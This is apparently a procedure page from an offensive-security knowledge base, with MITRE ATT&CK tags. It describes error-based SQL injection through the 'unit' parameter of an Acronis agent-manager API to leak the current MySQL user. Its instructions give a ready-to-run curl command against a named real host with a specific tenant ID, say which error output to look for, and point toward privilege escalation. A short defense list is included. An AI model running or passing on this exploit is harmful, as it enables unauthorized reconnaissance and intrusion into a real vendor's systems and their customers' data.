---
id: 123e4567-e89b-12d3-a456-426614174002
tags:
  - sqli
  - mysql
  - error-based
  - user-leak
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-sqli-user-leak]]'
verified: false
platforms:
  - Web
  - MySQL
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:26.294Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
---
id: 123e4567-e89b-12d3-a456-426614174002
name: Error-Based-SQL-Injection-to-Leak-Current-User
type: procedure
verified: false
submitted: false
created_at: 2023-10-01T00:00:00Z
updated_at: 2023-10-01T00:00:00Z
tactics: [[Initial Access]], [[Collection]]
techniques: [[Exploit Public-Facing Application]]
sub_techniques: []
tags: sqli, mysql, error-based, user-leak
commands: [[commands/curl-sqli-user-leak]]
platforms: Web, MySQL
tools: []
---

# Error-Based-SQL-Injection-to-Leak-Current-User

## Summary

This procedure exploits the SQL injection in the Acronis agent-manager API's 'unit' parameter to leak the current MySQL user via an error-based injection using extractvalue.

## Description

Similar to database name extraction, this targets the user() function in the payload: extractvalue(1, concat(char(126), (select user()))). The unsanitized 'unit' parameter allows injection, causing an XPath error that reveals the database user (e.g., 'user@host'). This provides reconnaissance on privileges, aiding escalation to dump tables or execute commands if higher privileges exist.

## Requirements

1. Network access to the target API endpoint
2. Valid tenant_id for authentication context
3. HTTP request tool (curl recommended)
4. Confirmation of MySQL usage from prior database leak

## Defense

Defensive measures and detection strategies:

- Parameterize all SQL queries to prevent injection
- Monitor API logs for anomalous parameters containing SQL functions like 'user()'
- Suppress detailed SQL errors in production responses
- Regular vulnerability scanning for API endpoints

## Objectives

1. Extract current database user for privilege assessment
2. Validate injection point for further exploitation
3. Identify potential escalation paths

## Instructions

### Step 1: Craft and Send User Extraction Payload

**Context**: Inject the payload to query the current user and embed it in an extractvalue error for leakage.

**Command** ([[commands/curl-sqli-user-leak]]):
```bash
curl -X GET "https://mc-beta-cloud.acronis.com/api/agent_manager/v2/unit_configurations?name=update-schedule&no_data=false&tenant_id=1590228&unit=atp-agent'%20and%2F%2A%2A%2Fextractvalue(1,concat(char(126),(select%20user())))%20and'%20" -v
```

> The command executes the GET request with the payload. Look for an error like "XPATH syntax error: '~dbuser@localhost'" in the response body. Verbose output helps debug connectivity issues. Failure may indicate input filtering or endpoint changes.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-sqli-user-leak]]

## Tools Used


## Tags

- sqli
- mysql
- error-based
- user-leak
